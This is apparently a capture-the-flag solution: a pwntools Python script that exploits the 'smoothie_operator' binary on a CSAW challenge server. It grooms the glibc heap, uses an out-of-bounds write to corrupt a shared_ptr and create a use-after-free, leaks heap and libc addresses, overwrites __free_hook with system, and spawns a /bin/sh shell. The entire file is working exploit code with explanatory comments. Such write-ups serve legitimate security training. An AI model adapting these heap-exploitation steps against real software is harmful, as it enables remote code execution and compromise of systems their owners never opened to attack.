from pwn import *

DEBUG = False 
LOCAL = False

def exploit():
    def binary_connect():
        if LOCAL:
            if DEBUG:
                return gdb.debug('../source/build/smoothie_operator', '''
                    set print asm-demangle
                    # b Order::Order()
                    # b prepare
                    # b Pastry::get_params()
                    # b OrderList::delete_order(unsigned int)
                    # b Pastry::edit_params()
                    # b operator<<(std::ostream&, Order const&)
                    continue
                ''')
            else:
                return process('../source/build/smoothie_operator')
        else:
            # return remote('127.0.0.1', 6666)
            return remote('pwn.chal.csaw.io', 6666)

    def print_queue():
        p.send(b"1\n")
        return p.recvuntil(b"-------------------------\n").decode()

    def add_monster(order_num, vec, dollars = 1, cents = 0) -> None:
        p.send(b"2\n")
        p.recvuntil(b"> ")
        p.send(b"2\n")
        p.recvuntil(b"$")
        p.send(str(dollars).encode() + b'.' + str(cents).encode() + b'\n')
        p.recvuntil(b"#")
        p.send(str(order_num).encode() + b'\n')
        for i in vec:
            p.recvuntil(b"? ")
            if i: 
                p.send(b'y\n')
                p.recvuntil(b"? ")
                p.send(str(i).encode() + b'\n')
            else: 
                p.send(b'n\n')
        if len(vec) < 7:
            for i in range(7 - len(vec)):
                p.recvuntil(b"? ")
                p.send(b'n\n')
        p.recvuntil(b"> ")

    def add_pastry(order_num, vec, dollars = 1, cents = 0) -> None:
        assert len(vec) == 3, print("error, vector length incorrect, must be 3")
        p.send(b"2\n")
        p.recvuntil(b"> ")
        p.send(b"3\n")
        p.recvuntil(b"$")
        p.send(str(dollars).encode() + b'.' + str(cents).encode() + b'\n')
        p.recvuntil(b"#")
        p.send(str(order_num).encode() + b'\n')
        for i in vec:
            p.recvuntil(b"? ")
            if i: 
                p.send(b'y\n')
                p.recvuntil(b"? ")
                p.send(str(i).encode() + b'\n')
            else: 
                p.send(b'n\n')
        if len(vec) < 10:
            for i in range(10 - len(vec)):
                p.recvuntil(b"? ")
                p.send(b'n\n')
        p.recvuntil(b"> ")

    def edit_pastry(order_num, idx, val, dollars, cents = 0) -> None:
        p.send(b"3\n")
        p.recvuntil(b"> ")
        p.send(str(order_num).encode() + b'\n')
        p.recvuntil(b"$")
        p.send(str(dollars).encode() + b'.' + str(cents).encode() + b'\n')
        p.recvuntil(b"edit: ")
        p.send(str(idx).encode() + b'\n')
        p.recvuntil(b"quantity: ")
        p.send(str(val).encode() + b'\n')
        p.recvuntil(b"> ")

    def edit_monster(order_num, idx, val, dollars, cents = 0) -> None:
        p.send(b"3\n")
        p.recvuntil(b"> ")
        p.send(str(order_num).encode() + b'\n')
        p.recvuntil(b"$")
        p.send(str(dollars).encode() + b'.' + str(cents).encode() + b'\n')
        p.recvuntil(b"edit: ")
        p.send(str(idx).encode() + b'\n')
        p.recvuntil(b"quantity: ")
        p.send(str(val).encode() + b'\n')
        p.recvuntil(b"> ")

    def prep_order(order_num) -> None:
        p.send(b"4\n")
        p.recvuntil(b"> ")
        p.send(str(order_num).encode() + b'\n')
        p.recvuntil(b"> ")
    
    def cancel_order(order_num) -> None:
        p.send(b"6\n")
        p.recvuntil(b"> ")
        p.send(str(order_num).encode() + b'\n')
        p.recvuntil(b"> ")

    def add_complaint(c) -> None:
        p.send(b"8\n")
        p.recvuntil(b":\n")
        p.send(c.encode() + b'\n')
        p.recvuntil(b"> ")

    def resolve_complaint(complaint_num) -> None:
        p.send(b"9\n")
        p.recvuntil(b"> ")
        p.send(str(complaint_num).encode() + b'\n')
        p.recvuntil(b"> ")

    def edit_complaint(complaint_num, data) -> None:
        p.send(b"10\n")
        p.recvuntil(b"> ")
        p.send(str(complaint_num).encode() + b'\n')
        p.recvuntil(b"complaint:\n")
        p.send(data + b'\n')
        p.recvuntil(b"> ")

    # exploit starts here 
    p = binary_connect()
    p.recvuntil(b"> ")

    # setup initial heap state 

    # allocate pastry object which will originate the OOB write
    add_monster(33, [1234, 4567, 6789], 20, 20)

    # add pastry so that we can free it to populate 0x50 cache, if needed
    add_pastry(101, [1234, 4567, 6789], 20, 20)

    # fill space, need to align a pastry object 0xff * 4 bytes after
    # the array start in a Monster object (0xff * 4), or ~0x3f8 bytes
    # each complaint will allocate only a 0x30 chunk, so long as it 
    # is 0x10 chars or less 

    # start with a complaint to get the alignment on the heap correct
    add_complaint("B" * 0x58)

    # allocate a bunch of 0x30 structs, needed for flipping tcache and fastbins
    for i in range(10):
        add_complaint(chr(i + 0x31))

    # add pastry which is target of the overflow 
    add_pastry(49, [ 0x414243, 0x414243, 0x414243 ], 0, 20)

    # overflow editing the original entry, clobbering order #49 shared_ptr control block
    edit_monster(33, 0, 0, 20, 20) # overwrites counter of shared pointer instances to 0

    # cancel order to populate 0x50
    cancel_order(101)

    # fill tcache
    resolve_complaint(1)
    resolve_complaint(1)
    resolve_complaint(1)
    resolve_complaint(1)
    resolve_complaint(1)
    resolve_complaint(1)

    # free the clobbered shared_ptr by triggering any use, such as moving it to a new state 
    prep_order(49)

    # dump queue, which should print a broken pointer in order #49
    leak1 = print_queue()
    leak1 = leak1[leak1.find("Order: #49") + len("Order: #49"):]
    leak1 = leak1[leak1.find("quantities:") + len("quantities:") + 1:]
    leak1 = int(leak1.split("\n")[1].split(" ")[-1]) + \
        (int(leak1.split("\n")[2].split(" ")[-1]) << 32)
    heap_addr = leak1
    fake_chunk_addr = heap_addr + 0xe0
    print(hex(fake_chunk_addr))

    # consolidate heap to dump libc address. This pushes the UAF (in fastbins)
    # to smallbins, which links to the main arena
    add_complaint("B" * 0x2000)

    # leaded address is main_arena + 0x128 (smallbins for 0x30)
    leak2 = print_queue()
    leak2 = leak2[leak2.find("Order: #49") + len("Order: #49"):]
    leak2 = leak2[leak2.find("quantities:") + len("quantities:") + 1:]
    leak2 = int(leak2.split("\n")[1].split(" ")[-1]) + \
        (int(leak2.split("\n")[2].split(" ")[-1]) << 32)    
    glibc_addr = leak2
    free_hook = glibc_addr + 0x2248
    system = free_hook - 0x19cbb8
    print(hex(free_hook))

    # empty tcache and both 0x30 in smallbins (incl. UAF)
    for i in range(7):
        add_complaint(chr(i + 0x31))
    
    # move all chunks back to fill tcache and fastbins, with the 
    # UAF in fastbins
    for i in range(7):
        resolve_complaint(7)
    resolve_complaint(1)

    # empty tcache and both 0x30 in smallbins
    # this puts the UAF overlapping a string, with the first index pointing to the 
    # string data
    for i in range(9):
        add_complaint(chr(i + 0x31))

    # add string that has its own /bin/sh allocation, so pointer points right at c_str
    add_complaint("/" * 0x30 + "bin/sh")

    # use the UAF to overwrite the string data pointer to free_hook
    # need to do it in two dword overwrites
    edit_pastry(49, 1, free_hook & 0xffffffff, 0, 20) 
    edit_pastry(49, 2, free_hook >> 32, 0, 20) 

    # edit the complaint, which now points at free hook, to &system
    edit_complaint(14, system.to_bytes(8, "little"))

    # free complaint 15 (/////.../bin/sh). It's giving shell
    p.send(b'9\n')
    p.recvuntil(b"> ")
    p.send(b'15\n')

    p.interactive()

if __name__ == "__main__":
#   context.log_level = "debug"
  exploit()
